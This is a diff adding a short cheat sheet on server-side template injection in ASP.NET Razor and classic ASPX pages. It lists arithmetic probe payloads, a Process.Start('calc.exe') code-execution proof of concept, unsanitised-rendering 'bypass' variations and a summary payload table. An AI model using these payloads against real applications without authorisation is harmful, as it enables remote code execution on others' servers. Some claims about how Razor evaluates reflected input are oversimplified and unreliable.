@@ -1,0 +1,72 @@
+🔍 1. Detecting SSTI in ASP.NET (Razor/ASPX)
+Try injecting basic expressions and look for any output or errors.
+
+🔸 Basic Test Payloads:
+html
+Copy
+Edit
+<%= 7 * 7 %>                 <!-- ASPX Classic Expression -->
+@{ var x = 7 * 7; }          <!-- Razor inline code -->
+@(7*7)                       <!-- Razor shorthand -->
+<%= Request["x"] %>          <!-- Reflective SSTI -->
+<% Response.Write(7*7); %>   <!-- Inline Classic ASP -->
+If 49 or an error shows up, you're likely dealing with some form of template execution.
+
+💥 2. Exploitable Payloads for ASP.NET
+If the injection is confirmed and Razor or classic ASP.NET is in use, try more dangerous expressions.
+
+🔸 Razor SSTI Payload (Server-side C#)
+cshtml
+Copy
+Edit
+@System.Diagnostics.Process.Start("calc.exe")
+⚠️ This will only work if Razor allows code execution and security restrictions (like trust level) aren't enforced.
+
+🔐 3. Bypass Payloads or Tricks
+If direct injection is sanitized, try variations:
+
+html
+Copy
+Edit
+@{ var x = "XSS"; }@x
+@Html.Raw(Request["x"])     <!-- Dangerous if input is unsanitized -->
+These are helpful in exploiting vulnerable MVC views where developers render untrusted data without sanitization.
+
+🛡️ 4. Realistic Use-Case
+Let’s say you find a parameter being reflected inside a Razor page like this:
+
+cshtml
+Copy
+Edit
+Hello @Model.Username
+If an attacker can control Username, and it is passed without encoding, they might try:
+
+text
+Copy
+Edit
+@System.Diagnostics.Process.Start("calc.exe")
+Or something less harmful for PoC:
+
+text
+Copy
+Edit
+@(3*3)
+If it outputs 9, you’ve got SSTI.
+
+🔎 5. Out-of-Scope but Related (ViewBag, ViewData)
+If you have access to the server or see templating with:
+
+cshtml
+Copy
+Edit
+@ViewBag.Input
+Then injecting into Input might also trigger SSTI.
+
+✅ Summary: Payload Cheatsheet for ASP.NET SSTI
+
+Payload	Description
+@{ var x = 5*5; } @x	Razor expression
+@(7*7)	Short Razor inline eval
+<%= 5*5 %>	ASPX classic
+<% Response.Write(5*5); %>	Classic inline ASP.NET code
+@System.Diagnostics.Process.Start("calc")	Code execution (PoC)
